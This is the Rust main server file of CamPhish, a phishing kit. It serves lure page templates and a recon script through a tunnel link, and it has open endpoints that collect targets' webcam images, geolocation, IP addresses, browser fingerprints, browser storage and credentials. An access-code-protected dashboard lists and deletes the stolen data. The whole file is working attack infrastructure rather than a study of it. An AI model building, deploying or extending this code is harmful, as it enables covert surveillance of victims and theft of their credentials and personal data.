use axum::extract::{ConnectInfo, State};
use axum::http::StatusCode;
use axum::routing::{delete, get, post};
use axum::{Json, Router};
use serde::Serialize;
use sqlx::SqlitePool;
use std::net::SocketAddr;
use std::sync::Arc;
use tower_http::compression::CompressionLayer;
use tower_http::cors::{Any, CorsLayer};
use tower_http::limit::RequestBodyLimitLayer;

use tower_http::trace::TraceLayer;

use axum::body::Body;
use axum::http::Request;
use axum::middleware::Next;
use axum::response::{IntoResponse, Response};

mod api;
mod auth;
mod capture;
mod db;
mod posthog;
mod templates;
mod trailbase;

pub struct AppState {
    pub pool: SqlitePool,
    pub data_dir: String,
    pub templates_dir: String,
    pub frontend_dir: String,
    pub template_cache: tokio::sync::RwLock<std::collections::HashMap<String, String>>,
    pub trailbase: Option<trailbase::TrailBaseClient>,
    pub version: String,
    pub rate_limiter: std::sync::Mutex<std::collections::HashMap<String, (u32, std::time::Instant)>>,
    pub http: reqwest::Client,
    pub access_code: String,
    pub recon_js_template: Option<String>,
    pub external_api_limiter: std::sync::Arc<tokio::sync::Semaphore>,
    pub posthog: posthog::PostHog,
}

impl AppState {
    pub async fn get_cached_template(&self, id: &str) -> Option<String> {
        let cache_enabled = std::env::var("ENABLE_TEMPLATE_CACHE")
            .map(|v| v == "true")
            .unwrap_or(true);
        if cache_enabled {
            self.template_cache.read().await.get(id).cloned()
        } else {
            None
        }
    }

    pub async fn cache_template(&self, id: &str, html: String) {
        let cache_enabled = std::env::var("ENABLE_TEMPLATE_CACHE")
            .map(|v| v == "true")
            .unwrap_or(true);
        if cache_enabled {
            self.template_cache.write().await.insert(id.to_string(), html);
        }
    }
}

#[derive(Serialize)]
struct HealthResponse {
    status: &'static str,
    service: &'static str,
    version: String,
    timestamp: String,
    uptime: u64,
    db_connected: bool,
    trailbase_connected: bool,
}

static START_TIME: std::sync::OnceLock<std::time::Instant> = std::sync::OnceLock::new();

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    dotenvy::dotenv().ok();

    let log_level = std::env::var("LOG_LEVEL").unwrap_or_else(|_| "info".into());
    tracing_subscriber::fmt().with_env_filter(log_level).init();

    START_TIME.set(std::time::Instant::now()).ok();

    let data_dir = std::env::var("DATA_DIR").unwrap_or_else(|_| "./data".into());
    let templates_dir = std::env::var("TEMPLATES_DIR").unwrap_or_else(|_| "./templates".into());
    let frontend_dir = std::env::var("FRONTEND_DIR").unwrap_or_else(|_| "./frontend/dist".into());
    let listen_addr = std::env::var("LISTEN_ADDR").unwrap_or_else(|_| "0.0.0.0:8080".into());
    let database_url = std::env::var("DATABASE_URL")
        .unwrap_or_else(|_| format!("sqlite://{}/camphish.db?mode=rwc", data_dir));

    // TrailBase connection (optional — falls back to SQLite if unavailable)
    let trailbase_url = std::env::var("TRAILBASE_URL").ok();
    let trailbase_key = std::env::var("TRAILBASE_API_KEY").ok();
    let trailbase = trailbase_url.map(|url| {
        tracing::info!("TrailBase data layer: {}", url);
        trailbase::TrailBaseClient::new(url, trailbase_key)
    });

    std::fs::create_dir_all(format!("{}/captures", data_dir))?;
    std::fs::create_dir_all(format!("{}/locations", data_dir))?;

    let version = std::env::var("VERSION").unwrap_or_else(|_| "2.1.0".into());
    tracing::info!("CamPhish v{} starting up...", version);

    let pool = db::init_pool(&database_url).await?;
    db::run_migrations(&pool).await?;

    // Self-healing: periodic DB + TrailBase connectivity check + WAL checkpoint
    let pool_clone = pool.clone();
    let tb_clone = trailbase.clone();
    tokio::spawn(async move {
        let interval = std::env::var("HEALTH_CHECK_INTERVAL")
            .ok()
            .and_then(|s| s.parse::<u64>().ok())
            .unwrap_or(30);
        let mut wal_counter: u64 = 0;
        loop {
            tokio::time::sleep(std::time::Duration::from_secs(interval)).await;
            match sqlx::query("SELECT 1").execute(&pool_clone).await {
                Ok(_) => tracing::debug!("SQLite health: OK"),
                Err(e) => tracing::error!("SQLite health FAILED: {}", e),
            }
            if let Some(ref tb) = tb_clone {
                if tb.health().await {
                    tracing::debug!("TrailBase health: OK");
                } else {
                    tracing::warn!("TrailBase health: FAILED — using SQLite fallback");
                }
            }
            wal_counter += interval;
            if wal_counter >= 3600 {
                let _ = sqlx::raw_sql("PRAGMA wal_checkpoint(TRUNCATE)").execute(&pool_clone).await;
                wal_counter = 0;
                tracing::debug!("WAL checkpoint completed");
            }
        }
    });

    let http = reqwest::Client::builder()
        .user_agent("CamPhish/2.1")
        .timeout(std::time::Duration::from_secs(5))
        .build()
        .unwrap_or_default();

    // External API rate limiter: 1 permit = 1 request; 3 permits = 3 concurrent max
    // ip-api.com allows 45 req/min; Nominatim 1 req/sec
    let external_api_limiter = std::sync::Arc::new(tokio::sync::Semaphore::new(3));

    let recon_path = format!("{}/recon.js", templates_dir);
    let recon_js_template = std::fs::read_to_string(&recon_path).ok();

    let posthog = posthog::PostHog::from_env().await;

    let access_code = auth::generate_access_code(&data_dir);
    std::env::set_var("CAMPHISH_ACCESS_CODE", &access_code);
    tracing::info!("🔐 Dashboard access code: {}", access_code);
    tracing::info!("🔐 Dashboard URL: http://{}/?code={}", listen_addr, access_code);
    tracing::info!("🔐 Access code file: {}/.access_code", data_dir);

    let state = Arc::new(AppState {
        pool: pool.clone(),
        data_dir: data_dir.clone(),
        templates_dir: templates_dir.clone(),
        frontend_dir: frontend_dir.clone(),
        template_cache: tokio::sync::RwLock::new(std::collections::HashMap::new()),
        trailbase,
        version: version.clone(),
        rate_limiter: std::sync::Mutex::new(std::collections::HashMap::new()),
        http,
        access_code: access_code.clone(),
        recon_js_template,
        external_api_limiter,
        posthog,
    });

    templates::scan_and_register(&state).await?;

    let allowed_origins = std::env::var("CORS_ORIGIN").unwrap_or_else(|_| "*".into());
    let cors = if allowed_origins == "*" {
        CorsLayer::new().allow_origin(Any).allow_methods([Method::GET, Method::POST, Method::DELETE]).allow_headers(Any)
    } else {
        CorsLayer::new()
            .allow_origin(allowed_origins.parse::<axum::http::HeaderValue>().unwrap())
            .allow_methods([Method::GET, Method::POST, Method::DELETE])
            .allow_headers(Any)
    };

    let compression = if std::env::var("ENABLE_COMPRESSION").map(|v| v != "false").unwrap_or(true) {
        Some(CompressionLayer::new())
    } else {
        None
    };

    let trace = if std::env::var("REQUEST_TRACING").map(|v| v != "false").unwrap_or(true) {
        Some(TraceLayer::new_for_http())
    } else {
        None
    };

        use axum::http::Method;

    // Capture endpoints (target-facing) — with body size limit
    let capture_routes = Router::new()
        .route("/image", post(capture::receive_image))
        .route("/location", post(capture::receive_location))
        .route("/ip", post(capture::receive_ip))
        .route("/fingerprint", post(capture::receive_fingerprint))
        .route("/event", post(capture::receive_event))
        .route("/storage", post(capture::receive_storage))
        .route("/credentials", post(capture::receive_credentials))
        .layer(RequestBodyLimitLayer::new(10 * 1024 * 1024)); // 10MB max

    // ========================================================================
    // Single router — public routes + dashboard API + SPA fallback.
    // The SPA fallback handler embeds its own access check.
    // Dashboard API routes are protected by auth + CSRF middleware.
    // Public capture/template/health endpoints have no middleware.
    // ========================================================================

    // Split into public and protected routers so route_layer only
    // applies to dashboard API routes, not public capture/template routes.
    let public_routes = Router::new()
        .route("/api/health", get(health))
        .route("/t/:template_id", get(templates::serve_template))
        .route("/t/recon.js", get(serve_recon_js))
        .nest("/api/capture", capture_routes);

    let dashboard_api = Router::new()
        .route("/api/stats", get(api::get_stats))
        .route("/api/captures", get(api::list_captures).delete(api::delete_all_captures))
        .route("/api/captures/:id", get(api::get_capture).delete(api::delete_capture))
        .route("/api/captures/:id/file", get(api::serve_capture_file))
        .route("/api/locations", get(api::list_locations).delete(api::delete_all_locations))
        .route("/api/ips", get(api::list_ips).delete(api::delete_all_ips))
        .route("/api/events", get(api::list_events).delete(api::delete_all_events))
        .route("/api/templates", get(api::list_templates))
        .route("/api/sessions", get(api::list_sessions).post(api::create_session))
        .route("/api/sessions/:id", get(api::get_session).delete(api::delete_session))
        .route("/api/credentials", get(api::list_credentials).delete(api::delete_all_credentials))
        .route("/api/credentials/:id", delete(api::delete_credential))
        .route("/api/storage", get(api::list_storage).delete(api::delete_all_storage))
        .route("/api/storage/:id", delete(api::delete_storage))
        .route_layer(axum::middleware::from_fn(auth::csrf_middleware))
        .route_layer(axum::middleware::from_fn(auth::auth_middleware));

    // Access code endpoint: shows code on local-only requests
    let access_routes = Router::new()
        .route("/api/access", get(serve_access_code));

    // Merge public + dashboard routes, then add SPA fallback + outer layers.
    // .fallback() BEFORE .layer() ensures layers wrap the fallback.
    let mut app = Router::new()
        .merge(public_routes)
        .merge(dashboard_api)
        .merge(access_routes)
        .fallback(serve_spa)
        .layer(cors)
        .layer(axum::middleware::from_fn(set_real_ip));

    if let Some(c) = compression { app = app.layer(c); }
    if let Some(t) = trace { app = app.layer(t); }

    let app = app.with_state(state);

    let addr: SocketAddr = listen_addr.parse()?;
    tracing::info!("✅ CamPhish v{} listening on http://{}", version, addr);

    let listener = tokio::net::TcpListener::bind(addr).await?;

    let graceful = std::env::var("GRACEFUL_SHUTDOWN").map(|v| v != "false").unwrap_or(true);
    if graceful {
        let shutdown = async {
            tokio::signal::ctrl_c().await.expect("install ctrl-c handler");
            tracing::info!("Graceful shutdown signal received, draining connections...");
        };
        axum::serve(listener, app.into_make_service_with_connect_info::<SocketAddr>())
            .with_graceful_shutdown(shutdown).await?;
    } else {
        axum::serve(listener, app.into_make_service_with_connect_info::<SocketAddr>()).await?;
    }

    tracing::info!("CamPhish v{} shutdown complete", version);
    Ok(())
}

async fn health(State(state): State<Arc<AppState>>) -> Json<HealthResponse> {
    let uptime = START_TIME.get().map(|t| t.elapsed().as_secs()).unwrap_or(0);
    let db_connected = sqlx::query("SELECT 1").execute(&state.pool).await.is_ok();
    let tb_connected = state.trailbase.as_ref().map(|_| true).unwrap_or(false);

    let status = if db_connected { "ok" } else { "degraded" };

    Json(HealthResponse {
        status,
        service: "camphish",
        version: state.version.clone(),
        timestamp: chrono::Utc::now().to_rfc3339(),
        uptime,
        db_connected,
        trailbase_connected: tb_connected,
    })
}

/// Middleware: sets X-Real-IP from the actual TCP socket when no proxy headers exist.
/// Fixes Docker deployments where port‑mapping strips the original client IP.
async fn set_real_ip(
    mut req: Request<Body>,
    next: Next,
) -> Response {
    if !req.headers().contains_key("x-forwarded-for") && !req.headers().contains_key("x-real-ip") {
        if let Some(ci) = req.extensions().get::<ConnectInfo<SocketAddr>>() {
            let ip = ci.0.ip().to_string();
            req.headers_mut().insert("x-real-ip", ip.parse().unwrap());
        }
    }
    next.run(req).await
}

/// Check if the request has a valid access cookie.
fn has_valid_cookie(req: &Request<Body>) -> bool {
    let expected = std::env::var("CAMPHISH_ACCESS_CODE").unwrap_or_default();
    if expected.is_empty() { return true; }
    req.headers()
        .get("Cookie")
        .and_then(|v| v.to_str().ok())
        .map(|c| c.contains(&format!("camphish_access={}", expected)))
        .unwrap_or(false)
}

/// Check if the request has a valid access code in the query string.
fn has_valid_query_code(req: &Request<Body>) -> bool {
    let expected = std::env::var("CAMPHISH_ACCESS_CODE").unwrap_or_default();
    if expected.is_empty() { return true; }
    req.uri().query().map_or(false, |q| {
        q.split('&').any(|pair| {
            let mut parts = pair.splitn(2, '=');
            parts.next() == Some("code") && parts.next() == Some(&expected)
        })
    })
}

/// Set the access cookie after a valid code-based login.
fn set_access_cookie(resp: &mut Response, expected: &str) {
    resp.headers_mut().insert(
        "Set-Cookie",
        format!(
            "camphish_access={}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400",
            expected
        )
        .parse()
        .unwrap(),
    );
}

/// Fallback handler — serves the SPA (static files from frontend/dist).
/// Access check is embedded directly.
async fn serve_spa(
    State(state): State<Arc<AppState>>,
    req: Request<Body>,
) -> Response {
    let expected = std::env::var("CAMPHISH_ACCESS_CODE").unwrap_or_default();
    let has_cookie = has_valid_cookie(&req);
    let has_query = has_valid_query_code(&req);

    if !has_cookie && !has_query {
        let html = format!(
            r#"<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CamPhish Dashboard</title><style>body{{background:#0a0e14;color:#b3b8c5;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}}main{{max-width:420px;padding:2rem;text-align:center}}h1{{font-size:1.5rem;font-weight:600;color:#e6e9ef;margin:0 0 .5rem}}p{{font-size:.875rem;color:#737a8a;margin:0 0 1.5rem;line-height:1.5}}.code{{font-family:ui-monospace,monospace;font-size:1.125rem;font-weight:600;color:#22d3ee;background:#0f172a;border:1px solid #1e293b;border-radius:.5rem;padding:.75rem 1rem;display:inline-block;letter-spacing:.05em}}.hint{{font-size:.75rem;color:#525a6a;margin-top:1.5rem;line-height:1.5}}code{{font-size:.75rem;background:#0f172a;padding:.125rem .375rem;border-radius:.25rem}}</style></head><body><main><h1>🔐 Dashboard Locked</h1><p>Enter the access code from your server logs or <code>.access_code</code> file.</p><div class="code">?code=XXXX-XXXX-XXXX-XXXX</div><p class="hint">Run <code>cat data/.access_code</code> in the project directory,<br>or check <code>docker compose logs app</code> for the code.</p></main></body></html>"#
        );
        let mut resp = Response::new(html.into());
        resp.headers_mut().insert(axum::http::header::CONTENT_TYPE, "text/html; charset=utf-8".parse().unwrap());
        resp.headers_mut().insert(axum::http::header::CACHE_CONTROL, "no-cache".parse().unwrap());
        return resp;
    }

    let set_cookie = has_query && !has_cookie;

    let frontend = &state.frontend_dir;
    let path = req.uri().path().trim_start_matches('/');
    let file_path = std::path::Path::new(frontend).join(path);

    if file_path.is_file() {
        let ext = file_path.extension()
            .and_then(|e| e.to_str())
            .unwrap_or("");
        let mime = mime_guess::from_ext(ext).first_or_else(|| "application/octet-stream".parse().unwrap());
        match tokio::fs::read(&file_path).await {
            Ok(data) => {
                let mut resp = Response::new(data.into());
                resp.headers_mut().insert(axum::http::header::CONTENT_TYPE, mime.to_string().parse().unwrap());
                if set_cookie { set_access_cookie(&mut resp, &expected); }
                return resp;
            }
            Err(_) => {}
        }
    }

    // Fall back to index.html for SPA client-side routing
    let index = std::path::Path::new(frontend).join("index.html");
    match tokio::fs::read(&index).await {
        Ok(data) => {
            let mut resp = Response::new(data.into());
            resp.headers_mut().insert(axum::http::header::CONTENT_TYPE, "text/html".parse().unwrap());
            if set_cookie { set_access_cookie(&mut resp, &expected); }
            resp
        }
        Err(_) => Response::builder()
            .status(StatusCode::NOT_FOUND)
            .body("SPA not found".into())
            .unwrap(),
    }
}

async fn serve_recon_js(State(state): State<Arc<AppState>>) -> Response {
    let path = format!("{}/recon.js", state.templates_dir);
    match std::fs::read_to_string(&path) {
        Ok(content) => {
            let api_base = std::env::var("TUNNEL_LINK").unwrap_or_default();
            let api_url = if api_base.is_empty() { "/api".to_string() } else { format!("{}/api", api_base) };
            let js = content
                .replace("API_BASE_URL", &api_url)
                .replace("forwarding_link", &api_base);
            let mut resp = Response::new(js.into());
            resp.headers_mut().insert(axum::http::header::CONTENT_TYPE, "application/javascript".parse().unwrap());
            resp.headers_mut().insert(axum::http::header::CACHE_CONTROL, "no-cache".parse().unwrap());
            resp
        }
        Err(_) => Response::builder()
            .status(StatusCode::NOT_FOUND)
            .body("recon.js not found".into())
            .unwrap()
    }
}

/// Returns the access code as plain text — only when accessed without
/// X-Forwarded-For header (i.e. direct/localhost access, not via tunnel).
async fn serve_access_code(
    State(state): State<Arc<AppState>>,
    req: Request<Body>,
) -> Response {
    let forwarded = req.headers().contains_key("x-forwarded-for");
    if forwarded {
        return (StatusCode::FORBIDDEN, "Access code not available via tunnel").into_response();
    }
    (StatusCode::OK, [("Content-Type", "text/plain")], state.access_code.clone()).into_response()
}
